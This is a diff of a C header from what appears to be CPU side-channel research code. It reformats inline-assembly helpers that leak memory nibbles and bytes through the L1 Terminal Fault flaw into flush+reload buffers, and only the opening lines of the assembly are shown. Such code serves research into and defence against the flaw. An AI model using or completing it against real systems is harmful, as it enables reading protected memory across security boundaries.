@@ -15,16 +15,15 @@
 // some additional post processing to reconstruct the data.
 #define AMOUNT_OF_OPTIONS_IN_NIBBLE 16
 #define AMOUNT_OF_NIBBLES_PER_RELOAD 2
-#define AMOUNT_OF_RELOAD_PAGES                                                 \
-  (AMOUNT_OF_OPTIONS_IN_NIBBLE * AMOUNT_OF_NIBBLES_PER_RELOAD)
-typedef uint8_t reload_buffer_t[AMOUNT_OF_NIBBLES_PER_RELOAD]
-                               [AMOUNT_OF_OPTIONS_IN_NIBBLE][PAGE_SIZE];
+#define AMOUNT_OF_RELOAD_PAGES (AMOUNT_OF_OPTIONS_IN_NIBBLE * AMOUNT_OF_NIBBLES_PER_RELOAD)
+typedef uint8_t bit_reload_buffer[PAGE_SIZE];
+typedef uint8_t reload_buffer_t[AMOUNT_OF_NIBBLES_PER_RELOAD][AMOUNT_OF_OPTIONS_IN_NIBBLE][PAGE_SIZE];
 
 #define AMOUNT_OF_BYTE_OPTIONS 256
 typedef uint8_t full_reload_buffer_t[AMOUNT_OF_BYTE_OPTIONS][PAGE_SIZE];
 
-static inline __attribute__((always_inline)) void
-asm_l1tf_leak_high_nibble(void *leak_addr, reload_buffer_t reload_buffer) {
+static inline __attribute__((always_inline)) void asm_l1tf_leak_high_nibble(void *leak_addr,
+                                                                            reload_buffer_t reload_buffer) {
   asm volatile("xor %%rax, %%rax\n"
                "movl $0xB1ABE849, %%r12d\n"
                "movl $0xCD7E16F1, %%r13d\n"
@@ -41,8 +40,8 @@ asm_l1tf_leak_high_nibble(void *leak_addr, reload_buffer_t reload_buffer) {
                : "rax", "r12", "r13", "r14");
 }
 
-static inline __attribute__((always_inline)) void
-asm_l1tf_leak_low_nibble(void *leak_addr, reload_buffer_t reload_buffer) {
+static inline __attribute__((always_inline)) void asm_l1tf_leak_low_nibble(void *leak_addr,
+                                                                           reload_buffer_t reload_buffer) {
   asm volatile("xor %%rax, %%rax\n"
                "movl $0xB1ABE849, %%r12d\n"
                "movl $0xCD7E16F1, %%r13d\n"
@@ -59,8 +58,8 @@ asm_l1tf_leak_low_nibble(void *leak_addr, reload_buffer_t reload_buffer) {
                : "rax", "r12", "r13", "r14");
 }
 
-static inline __attribute__((always_inline)) void
-asm_l1tf_leak_nibbles(void *leak_addr, reload_buffer_t reload_buffer) {
+static inline __attribute__((always_inline)) void asm_l1tf_leak_nibbles(void *leak_addr,
+                                                                        reload_buffer_t reload_buffer) {
   asm volatile("xor %%rax, %%rax\n"
                "xor %%rbx, %%rbx\n"
                "movl $0xB1ABE849, %%r12d\n"
@@ -85,8 +84,8 @@ asm_l1tf_leak_nibbles(void *leak_addr, reload_buffer_t reload_buffer) {
                : "rax", "rbx", "r12", "r13", "r14");
 }
 
-static inline __attribute__((always_inline)) void
-asm_l1tf_leak_full(void *leak_addr, full_reload_buffer_t reload_buffer) {
+static inline __attribute__((always_inline)) void asm_l1tf_leak_full(void *leak_addr,
+                                                                     full_reload_buffer_t reload_buffer) {
   asm volatile("xor %%rax, %%rax\n"
                "movl $0xB1ABE849, %%r12d\n"
                "movl $0xCD7E16F1, %%r13d\n"
@@ -107,9 +106,7 @@ asm_l1tf_leak_full(void *leak_addr, full_reload_buffer_t reload_buffer) {
 }
 
 static inline __attribute__((always_inline)) void
-asm_l1tf_leak_full_4_byte_mask(void *leak_addr,
-                               full_reload_buffer_t reload_buffer,
-                               const uint64_t subtract) {
+asm_l1tf_leak_full_4_byte_mask(void *leak_addr, full_reload_buffer_t reload_buffer, const uint64_t subtract) {
   asm volatile("xor %%rax, %%rax\n"
                "movq $0xffffffff, %%r15\n"
                "movl $0xB1ABE849, %%r12d\n"
